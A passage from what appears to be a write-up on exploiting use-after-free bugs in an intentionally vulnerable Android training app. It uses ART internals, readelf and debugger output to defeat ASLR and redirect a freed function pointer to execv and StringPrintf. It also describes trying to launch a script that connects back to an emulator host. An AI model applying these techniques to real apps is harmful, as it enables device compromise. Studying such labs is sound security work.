&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">_JNIEnv&lt;/span> {
&lt;span style="color:#75715e">/* do not rename this; it does not seem to be entirely opaque */&lt;/span>
&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">JNINativeInterface&lt;/span>&lt;span style="color:#f92672">*&lt;/span> functions;
...
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The definition of &lt;code>_JNIEnv&lt;/code> comes from &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:libnativehelper/include_jni/jni.h;drc=1e6140afcea4c0f4bd9480bcca29e7939a3999c9;l=489">here&lt;/a>. In structures, everything is public, therefore &lt;code>functions&lt;/code> is visible in &lt;code>JNIEnvExt&lt;/code>!&lt;/p>
&lt;p>Then also observe that (see &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:art/runtime/jni/jni_env_ext.h;l=165">code&lt;/a>)&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c++" data-lang="c++">&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">JNIEnvExt&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#66d9ef">public&lt;/span> JNIEnv {
...
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">const&lt;/span> JNINativeInterface&lt;span style="color:#f92672">*&lt;/span> table_override_ ...;
...
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Using&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ readelf --wide --symbols libart.so | grep &lt;span style="color:#e6db74">&amp;#34;_ZN3art9JNIEnvExt15table_override_E&amp;#34;&lt;/span>
3674: 0000000000e21cb8 &lt;span style="color:#ae81ff">8&lt;/span> OBJECT GLOBAL PROTECTED &lt;span style="color:#ae81ff">23&lt;/span> _ZN3art9JNIEnvExt15table_override_E
10840: 0000000000e21cb8 &lt;span style="color:#ae81ff">8&lt;/span> OBJECT GLOBAL PROTECTED &lt;span style="color:#ae81ff">23&lt;/span> _ZN3art9JNIEnvExt15table_override_E
$ readelf --wide --sections libart.so | grep .bss
&lt;span style="color:#f92672">[&lt;/span>23&lt;span style="color:#f92672">]&lt;/span> .bss NOBITS 0000000000e1fbe0 81fbe0 003bb0 &lt;span style="color:#ae81ff">00&lt;/span> WA &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>yields that &lt;code>JNIEnvExt::table_override&lt;/code> is part of &lt;code>.bss&lt;/code>, which again implies that we can overwrite this pointer with the &lt;em>Write - What - Where&lt;/em> condition.&lt;/p>
&lt;p>We can try to link both of the above together via &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:art/runtime/jni/jni_env_ext.cc;drc=1e6140afcea4c0f4bd9480bcca29e7939a3999c9;bpv=0;bpt=1;l=318">&lt;code>GetFunctionTable&lt;/code>&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">const&lt;/span> JNINativeInterface&lt;span style="color:#f92672">*&lt;/span> JNIEnvExt&lt;span style="color:#f92672">::&lt;/span>GetFunctionTable(&lt;span style="color:#66d9ef">bool&lt;/span> check_jni) {
&lt;span style="color:#66d9ef">const&lt;/span> JNINativeInterface&lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#66d9ef">override&lt;/span> &lt;span style="color:#f92672">=&lt;/span> JNIEnvExt&lt;span style="color:#f92672">::&lt;/span>table_override_;
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">override&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">nullptr&lt;/span>) {
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">override&lt;/span>;
}
&lt;span style="color:#66d9ef">return&lt;/span> check_jni &lt;span style="color:#f92672">?&lt;/span> GetCheckJniNativeInterface() &lt;span style="color:#f92672">:&lt;/span> GetJniNativeInterface();
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>and either &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:art/runtime/jni/jni_env_ext.cc;l=293;bpv=0;bpt=1">&lt;code>ThreadResetFunctionTable&lt;/code>&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">ThreadResetFunctionTable&lt;/span>(Thread&lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#66d9ef">thread&lt;/span>, &lt;span style="color:#66d9ef">void&lt;/span>&lt;span style="color:#f92672">*&lt;/span> arg ATTRIBUTE_UNUSED)
REQUIRES(Locks&lt;span style="color:#f92672">::&lt;/span>jni_function_table_lock_) {
JNIEnvExt&lt;span style="color:#f92672">*&lt;/span> env &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">thread&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>GetJniEnv();
&lt;span style="color:#66d9ef">bool&lt;/span> check_jni &lt;span style="color:#f92672">=&lt;/span> env&lt;span style="color:#f92672">-&amp;gt;&lt;/span>IsCheckJniEnabled();
env&lt;span style="color:#f92672">-&amp;gt;&lt;/span>functions &lt;span style="color:#f92672">=&lt;/span> JNIEnvExt&lt;span style="color:#f92672">::&lt;/span>GetFunctionTable(check_jni);
env&lt;span style="color:#f92672">-&amp;gt;&lt;/span>unchecked_functions_ &lt;span style="color:#f92672">=&lt;/span> GetJniNativeInterface();
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>or &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:art/runtime/jni/jni_env_ext.cc;l=118">&lt;code>SetCheckJniEnabled&lt;/code>&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">void&lt;/span> JNIEnvExt&lt;span style="color:#f92672">::&lt;/span>SetCheckJniEnabled(&lt;span style="color:#66d9ef">bool&lt;/span> enabled) {
check_jni_ &lt;span style="color:#f92672">=&lt;/span> enabled;
MutexLock &lt;span style="color:#a6e22e">mu&lt;/span>(Thread&lt;span style="color:#f92672">::&lt;/span>Current(), &lt;span style="color:#f92672">*&lt;/span>Locks&lt;span style="color:#f92672">::&lt;/span>jni_function_table_lock_);
functions &lt;span style="color:#f92672">=&lt;/span> GetFunctionTable(enabled);
&lt;span style="color:#75715e">// Check whether this is a no-op because of override.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (enabled &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> JNIEnvExt&lt;span style="color:#f92672">::&lt;/span>table_override_ &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">nullptr&lt;/span>) {
LOG(WARNING) &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Enabling CheckJNI after a JNIEnv function table override is not functional.&amp;#34;&lt;/span>;
}
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>So if either of the above functions was called with a modified &lt;code>JNIEnvExt::override_table_&lt;/code>, then the ART would overwrite the function table for all function calls performed via the first argument in a JNI function with pointers that we can control. An idea might be to redirect the function pointers to fitting gadgets&amp;hellip;&lt;/p>
&lt;p>Notice that &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:art/runtime/jni/jni_env_ext.cc;l=293;bpv=0;bpt=1">&lt;code>ThreadResetFunctionTable&lt;/code>&lt;/a> is a callback invoked inside a &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:art/runtime/jni/jni_env_ext.cc;l=301">&lt;code>foreach&lt;/code> - method&lt;/a>, i.e.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">void&lt;/span> JNIEnvExt&lt;span style="color:#f92672">::&lt;/span>SetTableOverride(&lt;span style="color:#66d9ef">const&lt;/span> JNINativeInterface&lt;span style="color:#f92672">*&lt;/span> table_override) {
MutexLock &lt;span style="color:#a6e22e">mu&lt;/span>(Thread&lt;span style="color:#f92672">::&lt;/span>Current(), &lt;span style="color:#f92672">*&lt;/span>Locks&lt;span style="color:#f92672">::&lt;/span>thread_list_lock_);
MutexLock &lt;span style="color:#a6e22e">mu2&lt;/span>(Thread&lt;span style="color:#f92672">::&lt;/span>Current(), &lt;span style="color:#f92672">*&lt;/span>Locks&lt;span style="color:#f92672">::&lt;/span>jni_function_table_lock_);
JNIEnvExt&lt;span style="color:#f92672">::&lt;/span>table_override_ &lt;span style="color:#f92672">=&lt;/span> table_override;
&lt;span style="color:#75715e">// See if we have a runtime. Note: we cannot run other code (like JavaVMExt&amp;#39;s CheckJNI install
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// code), as we&amp;#39;d have to recursively lock the mutex.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> Runtime&lt;span style="color:#f92672">*&lt;/span> runtime &lt;span style="color:#f92672">=&lt;/span> Runtime&lt;span style="color:#f92672">::&lt;/span>Current();
&lt;span style="color:#66d9ef">if&lt;/span> (runtime &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">nullptr&lt;/span>) {
runtime&lt;span style="color:#f92672">-&amp;gt;&lt;/span>GetThreadList()&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ForEach(ThreadResetFunctionTable, &lt;span style="color:#66d9ef">nullptr&lt;/span>);
&lt;span style="color:#75715e">// Core Platform API checks rely on stack walking and classifying the caller. If a table
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// override is installed do not try to guess what semantics should be.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> runtime&lt;span style="color:#f92672">-&amp;gt;&lt;/span>SetCorePlatformApiEnforcementPolicy(hiddenapi&lt;span style="color:#f92672">::&lt;/span>EnforcementPolicy&lt;span style="color:#f92672">::&lt;/span>kDisabled);
}
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>which seems to be free of any references to &lt;code>this&lt;/code>. Calling this function would update the function tables of every thread, which is the optimal thing to have. The big problem is that there needs to be a thread that can execute this function without crashing. If a thread crashed and took down the entire app, we would not be able to get code execution, because the JNI function would not be called. So we need a thread that is &amp;ldquo;crash - resistent&amp;rdquo;&amp;hellip; Also, in order to create a copy of that function pointer table, we would need to write at least &lt;code>sizeof (struct JNINativeInterface) = 0x748 bytes&lt;/code>, i.e. roughly half a page. The probability to break the app by overwriting global variables to this extent can be assumed to be very high.&lt;/p>
&lt;h4 id="alternative-idea-for-exploitation-of-useafterfreewritemodule">Alternative idea for exploitation of &lt;em>UseAfterFreeWriteModule&lt;/em>&lt;/h4>
&lt;p>There is a symbol called &lt;code>execv&lt;/code> in the symbol table of &lt;code>libart.so&lt;/code>, whose value is &lt;code>0&lt;/code>. Thus there is a &lt;code>.plt&lt;/code> entry for this function. According to an experiment, the following code runs without an error in the emulator:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
execv(&lt;span style="color:#e6db74">&amp;#34;/bin/sh&amp;#34;&lt;/span>, NULL);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Therefore, only the first parameter needs to be a global variable. The second one can be &lt;code>NULL&lt;/code>! But we &lt;strong>cannot&lt;/strong> trigger execution of arbitrary commands, as they would need parameters. If we were able to drop an executable file on the device, we could be able to execute this file assuming the app is granted enough permissions to access the executable.&lt;/p>
&lt;p>Seeing that the above approaches do not work or, which is more likely, are very time consuming, I decided to change the type of the vulnerability from a &lt;em>Write - What - Where&lt;/em> condition to an &lt;em>Execute&lt;/em> condition.&lt;/p>
&lt;h2 id="exploitation-of-useafterfreeexecmodule">Exploitation of &lt;em>UseAfterFreeExecModule&lt;/em>&lt;/h2>
&lt;p>The issue with this module is not just the leak (which is the same as in &lt;em>UseAfterFreeWriteModule&lt;/em>), but also the implementation of the key - value storage function:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">...
obj &lt;span style="color:#f92672">=&lt;/span> malloc(&lt;span style="color:#ae81ff">0x108&lt;/span>);
&lt;span style="color:#f92672">*&lt;/span>(code &lt;span style="color:#f92672">**&lt;/span>)((&lt;span style="color:#66d9ef">long&lt;/span>)obj &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x100&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> FUN_00100c60;
free(obj);
keyValue &lt;span style="color:#f92672">=&lt;/span> (object &lt;span style="color:#f92672">*&lt;/span>)calloc(&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">0x108&lt;/span>);
nameLength &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>GetArrayLength)(env,name);
len &lt;span style="color:#f92672">=&lt;/span> (uint)nameLength;
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#ae81ff">0x100&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> len) {
len &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x100&lt;/span>;
}
iscopy &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;\0&amp;#39;&lt;/span>;
nameBytes &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>GetByteArrayElements)(env,name,&lt;span style="color:#f92672">&amp;amp;&lt;/span>iscopy);
__memcpy_chk(keyValue,nameBytes,len,&lt;span style="color:#ae81ff">0xffffffffffffffff&lt;/span>);
keyValue&lt;span style="color:#f92672">-&amp;gt;&lt;/span>value &lt;span style="color:#f92672">=&lt;/span> value;
result &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(&lt;span style="color:#f92672">**&lt;/span>(code &lt;span style="color:#f92672">**&lt;/span>)((&lt;span style="color:#66d9ef">long&lt;/span>)obj &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x100&lt;/span>))(keyValue,&lt;span style="color:#ae81ff">0&lt;/span>);
resultLength &lt;span style="color:#f92672">=&lt;/span> __strlen_chk(&lt;span style="color:#f92672">&amp;amp;&lt;/span>result,&lt;span style="color:#ae81ff">0xffffffffffffffff&lt;/span>);
array &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>NewByteArray)(env,(jsize)resultLength);
(&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>SetByteArrayRegion)(env,array,&lt;span style="color:#ae81ff">0&lt;/span>,(jsize)resultLength,(jbyte &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>result);
...
&lt;/code>&lt;/pre>&lt;/div>&lt;p>In itself, only the fact that &lt;code>obj&lt;/code> is reused to call the function at &lt;code>obj + 0x100&lt;/code> seems to be an issue. Seeing that &lt;code>malloc(0x108)&lt;/code> and &lt;code>calloc(1, 0x108)&lt;/code> both allocate &lt;code>0x108&lt;/code> bytes, we can deduce (just as &lt;a href="#introducing-scudo-the-allocator">before&lt;/a>) that the same chunk is returned.&lt;/p>
&lt;p>Now we just have to exploit this&amp;hellip;&lt;/p>
&lt;h3 id="finding-a-better-obj--0x100">Finding a better &lt;em>obj + 0x100&lt;/em>&lt;/h3>
&lt;p>From &lt;a href="#leaking-data">the first section&lt;/a> we get a bunch of pointers. E.g. this might look like this:&lt;/p>
&lt;pre tabindex="0">&lt;code>[0]: 0x730b9d3c874e &amp;lt;-- ptr: &amp;quot;amazing_key&amp;quot;
[1]: 0x730b9d3c875a &amp;lt;-- ptr: &amp;quot;secret_key&amp;quot;
[2]: 0x730b9d3c8740 &amp;lt;-- ptr: &amp;quot;topsecret_key&amp;quot;
[3]: 0x730b9d3c8765 &amp;lt;-- ptr: &amp;quot;a_very_very_long_key_with_fancy_features_:D&amp;quot;
[4]: 0x730b9afdf9a0 &amp;lt;-- stack address: most likely examples
[5]: 0x2147eb93990de82b &amp;lt;-- looks more like a canary
[6]: 0x730b9afdf8d0 &amp;lt;-- stack address: stored rbp
[7]: 0x730c0379ffac &amp;lt;-- return address
&lt;/code>&lt;/pre>&lt;p>The first five addresses can be understood if one analyses &lt;code>lookupExamples&lt;/code>. The canary is often just a &lt;a href="https://link.springer.com/article/10.1007/s10207-018-00425-8">random 8 - byte value&lt;/a> that is pushed between a stack frame and the local variables. Depending on the canary type, this can be a terminator - canary, i.e. it contains e.g. a null - byte, or something else. On Android, it is a &lt;a href="https://link.springer.com/article/10.1007/s10207-018-00425-8">random canary&lt;/a>. Disassembling &lt;code>lookupExamples&lt;/code> yields&lt;/p>
&lt;pre tabindex="0">&lt;code>gef➤ disassemble Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeExecModule_lookupExamples
0x0000730b9d3c8990 &amp;lt;+0&amp;gt;: push rbp
0x0000730b9d3c8991 &amp;lt;+1&amp;gt;: mov rbp,rsp
0x0000730b9d3c8994 &amp;lt;+4&amp;gt;: sub rsp,0x70
0x0000730b9d3c8998 &amp;lt;+8&amp;gt;: mov rax,QWORD PTR fs:0x28
0x0000730b9d3c89a1 &amp;lt;+17&amp;gt;: mov QWORD PTR [rbp-0x8],rax
...
&lt;/code>&lt;/pre>&lt;p>and therefore the stack layout is as described above.&lt;/p>
&lt;p>The problem is that we want to execute e.g. &lt;code>execve&lt;/code> or similar, but this function is not referenced in the module itself. This is where the return address comes into play. On my machine, &lt;code>art_quick_generic_jni_trampoline&lt;/code> is the function that calls &lt;code>lookupExamples&lt;/code>. This may depend on, among other things, the way the function is specified in the java code, i.e. it could be static or non - static. In this case, the return address is &lt;code>art_quick_generic_jni_trampoline+220&lt;/code>.&lt;/p>
&lt;p>Running&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ readelf --wide --symbols libart.so | grep art_quick_generic_jni_trampoline
7145: 000000000039fed0 &lt;span style="color:#ae81ff">378&lt;/span> FUNC LOCAL HIDDEN &lt;span style="color:#ae81ff">14&lt;/span> art_quick_generic_jni_trampoline
&lt;/code>&lt;/pre>&lt;/div>&lt;p>gives the offset &lt;code>0x39fed0&lt;/code>. Thus, the base address (mind &lt;em>ASLR&lt;/em>) of &lt;code>libart.so&lt;/code> is&lt;/p>
&lt;pre tabindex="0">&lt;code>0x730c0379ffac - 220 - 0x39fed0 = 0x730c03400000
&lt;/code>&lt;/pre>&lt;p>From now on, all code in &lt;code>libart.so&lt;/code> is also available to us. Remember that we can overwrite a function pointer, whose function is called with &lt;strong>two&lt;/strong> parameters&lt;/p>
&lt;ol>
&lt;li>&lt;code>keyValue&lt;/code>: pointer to a user - controlled string&lt;/li>
&lt;li>&lt;code>&amp;lt;unknown&amp;gt;&lt;/code>: &lt;code>NULL&lt;/code>&lt;/li>
&lt;/ol>
&lt;p>We could gamble and hope that &lt;code>execve&lt;/code> works here, but most likely it will not. We again do not control enough parameters. Notice that looking for similar functions yields&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ readelf --wide --symbols libart.so | grep &lt;span style="color:#e6db74">&amp;#34;exec&amp;#34;&lt;/span>
199: &lt;span style="color:#ae81ff">0000000000000000&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> FUNC GLOBAL DEFAULT UND execv@LIBC &lt;span style="color:#f92672">(&lt;/span>2&lt;span style="color:#f92672">)&lt;/span>
200: &lt;span style="color:#ae81ff">0000000000000000&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> FUNC GLOBAL DEFAULT UND execve@LIBC &lt;span style="color:#f92672">(&lt;/span>2&lt;span style="color:#f92672">)&lt;/span>
271: &lt;span style="color:#ae81ff">0000000000000000&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> FUNC GLOBAL DEFAULT UND _ZN3art10DupCloexecEi
1304: &lt;span style="color:#ae81ff">0000000000000000&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> FILE LOCAL DEFAULT ABS exec_utils.cc
8795: &lt;span style="color:#ae81ff">0000000000000000&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> FUNC GLOBAL DEFAULT UND execv
8796: &lt;span style="color:#ae81ff">0000000000000000&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> FUNC GLOBAL DEFAULT UND execve
10033: &lt;span style="color:#ae81ff">0000000000000000&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> FUNC GLOBAL DEFAULT UND _ZN3art10DupCloexecEi
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Looking up &lt;code>execv&lt;/code> reveals&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">execv&lt;/span>(&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>pathname, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#66d9ef">const&lt;/span> argv[]);
&lt;/code>&lt;/pre>&lt;/div>&lt;p>This time, lets try to at least get to the point where we can execute an arbitrary executable file that we provided, as is described in a &lt;a href="#alternative-idea-for-exploitation-of-useafterfreewritemodule">previous section&lt;/a>.&lt;/p>
&lt;p>The attentive reader might have noticed that &lt;code>execv&lt;/code> does not have any offset, i.e. an offset of 0. Thus it will be resolved when the dynamic linker loads &lt;code>libart.so&lt;/code>. To solve that issue, we just have to figure out to which location a call to &lt;code>execv&lt;/code> transfers control. Introducing: &lt;code>.plt&lt;/code>!&lt;/p>
&lt;p>One way to find the offset and thus the address of &lt;code>execv&lt;/code> is to search for calls of &lt;code>execv&lt;/code> in the binary. It turns out that &lt;code>ExecWithoutWait&lt;/code> calls &lt;code>execv&lt;/code>. Disassembling it yields:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ readelf --wide --symbols libart.so | grep ExecWithoutWait
1305: 00000000004b6ac0 560 FUNC LOCAL DEFAULT 14 _ZN3art12_GLOBAL__N_115ExecWithoutWaitERNSt3__16vectorINS1_12basic_stringIcNS1_11char_traitsIcEENS1_9allocatorIcEEEENS6_IS8_EEEE
gef➤ disassemble 0x4b6ac0 + 0x730c03400000
...
0x0000730c038b6bf8 &amp;lt;+312&amp;gt;: mov rsi,QWORD PTR [rsp+0x20]
0x0000730c038b6bfd &amp;lt;+317&amp;gt;: mov rdi,r14
0x0000730c038b6c00 &amp;lt;+320&amp;gt;: call 0x730c03e08f80 &amp;lt;--- symbol stub for execv
0x0000730c038b6c05 &amp;lt;+325&amp;gt;: jmp 0x730c038b6c14 &amp;lt;_ZN3art12_GLOBAL__N_115ExecWithoutWaitERNSt3__16vectorINS1_12basic_stringIcNS1_11char_traitsIcEENS1_9allocatorIcEEEENS6_IS8_EEEE+340&amp;gt;
...
&lt;/code>&lt;/pre>&lt;p>As we know the base address of &lt;code>libart.so&lt;/code>, we can compute &lt;code>0x730c03e08f80 - 0x730c03400000 = 0xa08f80&lt;/code>. If we uploaded a test client shell script that connects to &lt;code>10.0.2.2:4444&lt;/code>, chose &lt;code>key = &amp;quot;/data/local/tmp/client&amp;quot;&lt;/code> and &lt;code>value=&amp;lt;address of execv&amp;gt;&lt;/code>, we would expect to get a connection&amp;hellip;but unfortunately, execution gets denied with an error:&lt;/p>
&lt;pre tabindex="0">&lt;code>/com.damnvulnerableapp W/Thread-2: type=1400 audit(0.0:3799): avc: denied { execute } for name=&amp;quot;client&amp;quot; dev=&amp;quot;dm-5&amp;quot; ino=65602 scontext=u:r:untrusted_app:s0:c152,c256,c512,c768 tcontext=u:object_r:shell_data_file:s0 tclass=file permissive=0 app=com.damnvulnerableapp
&lt;/code>&lt;/pre>&lt;h3 id="trying-to-earn-all-the-fruits">Trying to earn all the fruits&lt;/h3>
&lt;p>As you may have noticed, the above does not really help other than crashing the app. What we want is &lt;strong>arbitrary code execution&lt;/strong>!!! Thus, we can try to transform the above UAF vulnerability into another vulnerability, e.g. a format string vulnerability that is easier to exploit!&lt;/p>
&lt;p>Observe that there is a function called &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:system/libbase/stringprintf.cpp;l=68">&lt;code>StringPrintf&lt;/code>&lt;/a>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">std&lt;span style="color:#f92672">::&lt;/span>string StringPrintf(&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span> fmt, ...) {
va_list ap;
va_start(ap, fmt);
std&lt;span style="color:#f92672">::&lt;/span>string result;
StringAppendV(&lt;span style="color:#f92672">&amp;amp;&lt;/span>result, fmt, ap);
va_end(ap);
&lt;span style="color:#66d9ef">return&lt;/span> result;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>which is a perfect target as we fully control the content of &lt;code>key&lt;/code>! Using the same trick as above or by just disassembling the whole &lt;code>.plt&lt;/code> and searching for &lt;code>StringPrintf&lt;/code> will reveal that its offset is &lt;code>0xa08570&lt;/code> (in &lt;code>.plt&lt;/code>). Notice that &lt;code>StringPrintf&lt;/code> internally calls &lt;code>StringAppendV&lt;/code>, which again calls &lt;code>vsnprintf&lt;/code>.&lt;/p>
&lt;p>Therefore, set &lt;code>key=&amp;lt;format string&amp;gt;&lt;/code> and &lt;code>value=address of StringPrintf@plt&lt;/code>.&lt;/p>
&lt;p>Testing this reveals that we might be able to use format strings like &amp;ldquo;%4242x&amp;rdquo;, but not &amp;ldquo;%4242x%n&amp;rdquo;, because of the implementation of &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:bionic/libc/stdio/vfprintf.cpp;l=454;bpv=0;bpt=1">&lt;code>vfprintf&lt;/code>&lt;/a>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">...
&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;n&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
__fortify_fatal(&lt;span style="color:#e6db74">&amp;#34;%%n not allowed on Android&amp;#34;&lt;/span>);
...
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Also, for the above to work, we would need to adjust the call to &lt;code>obj + 0x100&lt;/code> like:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">&lt;span style="color:#66d9ef">char&lt;/span> buffer[&lt;span style="color:#ae81ff">32&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> { &lt;span style="color:#ae81ff">0&lt;/span> };
